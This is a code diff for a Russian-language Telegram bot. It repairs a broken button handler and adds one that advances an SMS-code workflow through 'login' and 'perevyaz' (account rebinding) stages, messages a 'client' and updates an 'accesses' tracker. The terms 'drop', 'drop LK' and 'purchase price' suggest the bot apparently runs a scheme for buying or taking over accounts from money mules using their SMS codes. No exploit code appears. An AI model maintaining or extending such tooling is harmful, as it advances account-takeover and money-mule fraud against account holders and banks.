@@ -4683,7 +4683,7 @@ async def handle_sms_code(message: Message, state: FSMContext):
                     [
                         InlineKeyboardButton(
                             text="✅ Успех",
-                            callback_data="smsmsgclose",
+                            callback_data=f"smsok:{droplk_id}:{sms_kind}",
                         ),
                         InlineKeyboardButton(
                             text="🔁 Запросить повтор",
@@ -4761,24 +4761,59 @@ async def cb_smsretry(call: CallbackQuery):
 
 @router.callback_query(F.data == "smsmsgclose")
 async def cb_smsmsgclose(call: CallbackQuery):
+    """Тихое закрытие/удаление служебного сообщения (❌).
+    SIMBA FIX (04.08.2026): раньше содержал битый код с NameError (lk/drop/message
+    были из другого scope) — просто оставляем удаление сообщения без прочих
+    действий. Для «✅ Успех» с advance stage — см. cb_smsok ниже.
+    """
     try:
         await call.message.delete()
     except Exception:
         pass
     await call.answer()
-    # Обновляем сообщение в admin-чате
-    admin_chat = get_admin_chat_id_for(lk)
-    if drop and admin_chat and drop.get("admin_msg_id"):
-        try:
-            drop = crm_storage.get_drop_any(_extract_drop_id(lk))
-            await message.bot.edit_message_text(
-                await _render_admin_text(drop),
-                chat_id=admin_chat, message_id=drop["admin_msg_id"],
-                reply_markup=_admin_keyboard(drop),
-                disable_web_page_preview=True,
-            )
-        except Exception as e:
-            logger.warning("sms admin edit failed: %s", e)
+
+
+@router.callback_query(F.data.startswith("smsok:"))
+async def cb_smsok(call: CallbackQuery):
+    """SIMBA FIX: кнопка «✅ Успех» после SMS-кода (login/perevyaz).
+    callback_data: smsok:<droplk_id>:<sms_kind>
+    Действия:
+      1) Advance SMS-flow (login_received → perevyaz_asked, perevyaz_received → done)
+      2) _sms_advance_flow сам шлёт клиенту в work_chat сообщение о следующем шаге
+         (или создаёт lk_card если это финал perevyaz)
+      3) Удаляет сообщение с кодом в admin-чате.
+    Раньше эта кнопка НИЧЕГО не делала — клиенту молчание, stage не менялся.
+    """
+    parts = (call.data or "").split(":", 2)
+    if len(parts) < 3:
+        await call.answer("Bad data", show_alert=True)
+        return
+    droplk_id = parts[1]
+    sms_kind = parts[2]  # 'login' / 'perevyaz'
+    lk = crm_storage.get_drop_lk_any(droplk_id)
+    if not lk:
+        await call.answer("ЛК не найден", show_alert=True)
+        return
+    # Advance stage: login_received/perevyaz_received → _sms_advance_flow
+    # шлёт следующий запрос клиенту (СМС-код перевяза / создаёт карточку).
+    try:
+        result = await _sms_advance_flow(call.bot, droplk_id)
+        logger.info("[smsok] advance for droplk=%s kind=%s → %s", droplk_id, sms_kind, result)
+    except Exception as e:
+        logger.exception("[smsok] _sms_advance_flow failed: %s", e)
+        await call.answer(f"⚠️ Ошибка: {e}", show_alert=True)
+        return
+    # Удаляем сообщение с кодом (оно больше не нужно)
+    try:
+        await call.message.delete()
+    except Exception:
+        pass
+    # Обновляем tracker в группе ДОСТУПЫ (следующий этап)
+    try:
+        await _post_or_update_sms_tracker(call.bot, droplk_id)
+    except Exception:
+        pass
+    await call.answer("✅ Код принят, клиент уведомлён")
 
 
 # Цена покупки (этап 4)
